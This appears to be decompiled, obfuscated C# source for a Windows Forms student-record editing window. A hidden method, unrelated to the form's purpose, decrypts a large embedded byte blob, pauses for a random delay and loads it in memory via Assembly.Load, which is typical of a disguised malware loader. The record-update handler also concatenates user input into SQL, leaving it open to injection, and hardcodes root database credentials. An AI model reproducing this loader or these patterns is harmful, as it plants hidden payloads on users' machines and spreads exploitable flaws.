using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Lb5n;
using Mf5q;
using Microsoft.VisualBasic.CompilerServices;
using Mw03;
using Wi84;
using d4G;
using g7J;
using m5GN;
using x5X;

namespace q8R9;

[DesignerGenerated]
public class z8L1 : Form
{
	private IContainer components;

	private Label _Label1;

	private Label _Label4;

	private Label _Label5;

	internal Label a;

	internal TextBox y;

	internal Label l;

	internal TextBox w;

	internal DateTimePicker B;

	internal ComboBox q;

	internal Button I;

	internal Button O;

	public z8L1()
	{
		((Form)this).add_Load((EventHandler)o7AX);
		Ka6x();
	}

	protected override void Bz04(bool Bd78)
	{
		try
		{
			if (Bd78 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Bd78);
		}
	}

	private void Ka6x()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		p0PS(new Label());
		Yq9w(new Label());
		Pc1b(new TextBox());
		Pi14(new Label());
		Td85(new TextBox());
		q3Y4(new Label());
		d9H6(new DateTimePicker());
		e8JF(new Label());
		Ay8m(new ComboBox());
		Ft93(new Button());
		Da97(new Button());
		((Control)this).SuspendLayout();
		w6WH().set_AutoSize(true);
		((Control)w6WH()).set_Font(new Font("Comic Sans MS", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)w6WH()).set_Location(new Point(194, 9));
		((Control)w6WH()).set_Name("Label1");
		((Control)w6WH()).set_Size(new Size(94, 30));
		((Control)w6WH()).set_TabIndex(1);
		w6WH().set_Text("Student");
		Fo37().set_AutoSize(true);
		((Control)Fo37()).set_Location(new Point(12, 64));
		((Control)Fo37()).set_Name("Label2");
		((Control)Fo37()).set_Size(new Size(35, 13));
		((Control)Fo37()).set_TabIndex(2);
		Fo37().set_Text("Name");
		((Control)p5DS()).set_Location(new Point(99, 61));
		((Control)p5DS()).set_Name("SName");
		((Control)p5DS()).set_Size(new Size(327, 20));
		((Control)p5DS()).set_TabIndex(3);
		e7SZ().set_AutoSize(true);
		((Control)e7SZ()).set_Location(new Point(12, 96));
		((Control)e7SZ()).set_Name("Label3");
		((Control)e7SZ()).set_Size(new Size(65, 13));
		((Control)e7SZ()).set_TabIndex(4);
		e7SZ().set_Text("Roll Number");
		((Control)Xb15()).set_Location(new Point(99, 89));
		((Control)Xb15()).set_Name("SRoll");
		((TextBoxBase)Xb15()).set_ReadOnly(true);
		((Control)Xb15()).set_Size(new Size(327, 20));
		((Control)Xb15()).set_TabIndex(5);
		Lq92().set_AutoSize(true);
		((Control)Lq92()).set_Location(new Point(12, 127));
		((Control)Lq92()).set_Name("Label4");
		((Control)Lq92()).set_Size(new Size(66, 13));
		((Control)Lq92()).set_TabIndex(6);
		Lq92().set_Text("Date of Birth");
		((Control)e3Z5()).set_Location(new Point(99, 121));
		e3Z5().set_MaxDate(new DateTime(2010, 12, 31, 0, 0, 0, 0));
		e3Z5().set_MinDate(new DateTime(1985, 1, 1, 0, 0, 0, 0));
		((Control)e3Z5()).set_Name("DateTimePicker1");
		((Control)e3Z5()).set_Size(new Size(200, 20));
		((Control)e3Z5()).set_TabIndex(7);
		e3Z5().set_Value(new DateTime(2010, 12, 31, 0, 0, 0, 0));
		Te6c().set_AutoSize(true);
		((Control)Te6c()).set_Location(new Point(12, 160));
		((Control)Te6c()).set_Name("Label5");
		((Control)Te6c()).set_Size(new Size(62, 13));
		((Control)Te6c()).set_TabIndex(8);
		Te6c().set_Text("Department");
		r0P8().set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)r0P8()).set_FormattingEnabled(true);
		r0P8().get_Items().AddRange(new object[15]
		{
			"Aerospace Engineering", "Food Technology Bio-Chemical Engineering", "Computer Science and Engineering", "Electronics and Telecommunications Engineering", "Electrical Engineering", "Civil Engineering", "Mechanical Engineering", "Chemical Engineering", "Printing Engineering", "Information Technology",
			"Production Engineering", "Instrumentation and Electronics Engineering", "Metallurgical and Material Engineering", "Power Engineering", "Pharmaceutical Technology "
		});
		((Control)r0P8()).set_Location(new Point(99, 157));
		((Control)r0P8()).set_Name("ComboBoxDept");
		((Control)r0P8()).set_Size(new Size(327, 21));
		((Control)r0P8()).set_TabIndex(9);
		((ButtonBase)Ky2s()).set_BackColor(Color.Red);
		((Control)Ky2s()).set_Location(new Point(136, 192));
		((Control)Ky2s()).set_Name("Button1");
		((Control)Ky2s()).set_Size(new Size(203, 23));
		((Control)Ky2s()).set_TabIndex(10);
		((ButtonBase)Ky2s()).set_Text("Update Record");
		((ButtonBase)Ky2s()).set_UseVisualStyleBackColor(false);
		((Control)b0C4()).set_Location(new Point(172, 226));
		((Control)b0C4()).set_Name("Button2");
		((Control)b0C4()).set_Size(new Size(127, 23));
		((Control)b0C4()).set_TabIndex(11);
		((ButtonBase)b0C4()).set_Text("View Database");
		((ButtonBase)b0C4()).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(457, 261));
		((Control)this).get_Controls().Add((Control)(object)b0C4());
		((Control)this).get_Controls().Add((Control)(object)Ky2s());
		((Control)this).get_Controls().Add((Control)(object)r0P8());
		((Control)this).get_Controls().Add((Control)(object)Te6c());
		((Control)this).get_Controls().Add((Control)(object)e3Z5());
		((Control)this).get_Controls().Add((Control)(object)Lq92());
		((Control)this).get_Controls().Add((Control)(object)Xb15());
		((Control)this).get_Controls().Add((Control)(object)e7SZ());
		((Control)this).get_Controls().Add((Control)(object)p5DS());
		((Control)this).get_Controls().Add((Control)(object)Fo37());
		((Control)this).get_Controls().Add((Control)(object)w6WH());
		((Control)this).set_Name("EditForm");
		((Form)this).set_Text("EditForm");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label w6WH()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p0PS(Label Pb24)
	{
		_Label1 = Pb24;
	}

	[SpecialName]
	internal virtual Label Fo37()
	{
		return a;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yq9w(Label Ng10)
	{
		Label val = (a = Ng10);
	}

	[SpecialName]
	internal virtual TextBox p5DS()
	{
		return y;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pc1b(TextBox Le28)
	{
		EventHandler eventHandler = m2GC;
		TextBox val = y;
		if (val != null)
		{
			((Control)val).remove_TextChanged(eventHandler);
		}
		TextBox val2 = (y = Le28);
		val = y;
		if (val != null)
		{
			((Control)val).add_TextChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label e7SZ()
	{
		return l;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pi14(Label Ht83)
	{
		Label val = (l = Ht83);
	}

	[SpecialName]
	internal virtual TextBox Xb15()
	{
		return w;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Td85(TextBox r6X5)
	{
		TextBox val = (w = r6X5);
	}

	[SpecialName]
	internal virtual Label Lq92()
	{
		return _Label4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q3Y4(Label Ro0e)
	{
		_Label4 = Ro0e;
	}

	[SpecialName]
	internal virtual DateTimePicker e3Z5()
	{
		return B;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d9H6(DateTimePicker Bd32)
	{
		DateTimePicker val = (B = Bd32);
	}

	[SpecialName]
	internal virtual Label Te6c()
	{
		return _Label5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e8JF(Label Jx37)
	{
		_Label5 = Jx37;
	}

	[SpecialName]
	internal virtual ComboBox r0P8()
	{
		return q;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ay8m(ComboBox m7E3)
	{
		ComboBox val = (q = m7E3);
	}

	[SpecialName]
	internal virtual Button Ky2s()
	{
		return I;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ft93(Button b0F5)
	{
		EventHandler eventHandler = Nc09;
		Button i = I;
		if (i != null)
		{
			((Control)i).remove_Click(eventHandler);
		}
		Button val = (I = b0F5);
		i = I;
		if (i != null)
		{
			((Control)i).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button b0C4()
	{
		return O;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Da97(Button k4DJ)
	{
		EventHandler eventHandler = p0B7;
		Button o = O;
		if (o != null)
		{
			((Control)o).remove_Click(eventHandler);
		}
		Button val = (O = k4DJ);
		o = O;
		if (o != null)
		{
			((Control)o).add_Click(eventHandler);
		}
	}

	private void o7AX(object sender, EventArgs e)
	{
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_MaximizeBox(false);
		p5DS().set_Text(Conversions.ToString(Lg27.Forms.i4J2().dbDataSet.Rows[0][1]));
		Xb15().set_Text(Conversions.ToString(Lg27.Forms.i4J2().dbDataSet.Rows[0][0]));
		e3Z5().set_Text(Conversions.ToString(Lg27.Forms.i4J2().dbDataSet.Rows[0][2]));
		r0P8().set_Text(Conversions.ToString(Lg27.Forms.i4J2().dbDataSet.Rows[0][3]));
	}

	internal static byte[] s8FH(int[] Bj15, int k4BA)
	{
		checked
		{
			byte[] array = new byte[k4BA + 1];
			int num = Bj15.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = (byte)Bj15[i];
			}
			return array;
		}
	}

	private void Nc09(object sender, EventArgs e)
	{
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		j6R j6R = new j6R();
		j6R.Jq8("server=localhost;userid=root;password=root;database=student;");
		try
		{
			j6R.f1N();
			_ = "UPDATE student.student_info set Student_Name='" + p5DS().get_Text() + "', Date_of_Birth='" + e3Z5().get_Text() + "',Department='" + r0P8().get_Text() + "' where Roll_Number = '" + Xb15().get_Text() + "';";
			Ms8 ms = new Ms8();
			Qq8w qq8w = ms.n6D();
			MessageBox.Show("Data is Updated !");
			qq8w.Sz54();
			j6R.Dt5();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			j6R.g5Z();
		}
	}

	internal static void Pz5m()
	{
		byte[] array = i2RH.o3E4(133632);
		checked
		{
			int @as = Conversions.ToInteger(p1RD.mDic[p1RD.sNum]) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = q9QN.Dy4c(array[i], (byte[])p1RD.mDic[p1RD.sArray], @as, i);
			}
			p1RD.mDic.Add(p1RD.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			Assembly assembly = null;
			array = (byte[])p1RD.mDic[p1RD.mArray];
			assembly = Assembly.Load(array);
			p1RD.mDic.Add("Deep", assembly);
			assembly = null;
			if (Ts5.Jk9())
			{
				q9QN.Wm54();
			}
		}
	}

	private void p0B7(object sender, EventArgs e)
	{
		((Control)Lg27.Forms.Af9x()).Show();
	}

	private void m2GC(object sender, EventArgs e)
	{
	}
}
